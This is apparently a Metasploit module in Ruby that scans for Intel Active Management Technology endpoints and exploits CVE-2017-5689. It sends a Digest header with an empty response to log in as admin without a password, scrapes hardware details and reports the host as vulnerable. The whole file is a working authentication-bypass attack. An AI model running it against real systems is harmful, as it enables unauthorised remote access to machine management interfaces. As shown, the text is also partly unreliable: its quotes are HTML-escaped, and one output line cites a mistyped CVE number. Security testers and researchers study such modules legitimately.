# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;rex/proto/http&#039;

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      &#039;Name&#039;        => &#039;Intel AMT Digest Authentication Bypass Scanner&#039;,
      &#039;Description&#039; => %q{
        This module scans for Intel Active Management Technology endpoints and attempts
        to bypass authentication using a blank HTTP digest (CVE-2017-5689). This service
        can be found on ports 16992, 16993 (tls), 623, and 624(tls).
      },
      &#039;Author&#039;      => &#039;hdm&#039;,
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2017-5689&#039; ],
          [ &#039;URL&#039;, &#039;https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability&#039; ],
          [ &#039;URL&#039;, &#039;https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&languageid=en-fr&#039; ],
        ],
      &#039;DisclosureDate&#039; => &#039;May 05 2017&#039;
    )

    register_options(
      [
        Opt::RPORT(16992),
      ])
  end

  # Fingerprint a single host
  def run_host(ip)
    begin
      connect
      res = send_request_raw({ &#039;uri&#039; => &#039;/hw-sys.htm&#039;, &#039;method&#039; => &#039;GET&#039; })
      unless res && res.headers[&#039;Server&#039;].to_s.index(&#039;Intel(R) Active Management Technology&#039;)
        disconnect
        return
      end

      vprint_status("#{ip}:#{rport} - Found an Intel AMT endpoint: #{res.headers[&#039;Server&#039;]}")

      unless res.headers[&#039;WWW-Authenticate&#039;] =~ /realm="([^"]+)".*nonce="([^"]+)"/
        vprint_status("#{ip}:#{rport} - AMT service did not send a valid digest response")
        disconnect
        return
      end

      realm = $1
      nonce = $2
      cnonce = Rex::Text.rand_text(10)

      res = send_request_raw(
        {
          &#039;uri&#039;     => &#039;/hw-sys.htm&#039;,
          &#039;method&#039;  => &#039;GET&#039;,
          &#039;headers&#039; => {
            &#039;Authorization&#039; =>
              "Digest username=\"admin\", realm=\"#{realm}\", nonce=\"#{nonce}\", uri=\"/hw-sys.htm\", " +
              "cnonce=\"#{cnonce}\", nc=1, qop=\"auth\", response=\"\""
          }
        })

      unless res && res.body.to_s.index("Computer model")
        vprint_error("#{ip}:#{rport} - AMT service does not appear to be vulnerable")
        return
      end

      proof = res.body.to_s
      proof_hash = nil

      info_keys = res.body.scan(/<td class=r1><p>([^\<]+)<\/p>/).map{|x| x.first.to_s.gsub("&#x2F;", "/") }
      if info_keys.length > 0
        proof_hash = {}
        proof = ""

        info_vals = res.body.scan(/<td class=r1>([^\<]+)</).map{|x| x.first.to_s.gsub("&#x2F;", "/") }
        info_keys.each do |ik|
          iv = info_vals.shift
          break unless iv
          proof_hash[ik] = iv
          proof << "#{iv}: #{ik}\n"
        end
      end

      print_good("#{ip}:#{rport} - Vulnerable to CVE-2017-5869 #{proof_hash.inspect}")

      report_note(
        :host  => ip,
        :proto => &#039;tcp&#039;,
        :port  => rport,
        :type  => &#039;intel.amt.system_information&#039;,
        :data  => proof_hash
      )

      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => &#039;tcp&#039;,
        :name  => "Intel AMT Digest Authentication Bypass",
        :refs  => self.references,
        :proof => proof
      })

    rescue ::Timeout::Error, ::Errno::EPIPE
    ensure
      disconnect
    end
  end

end

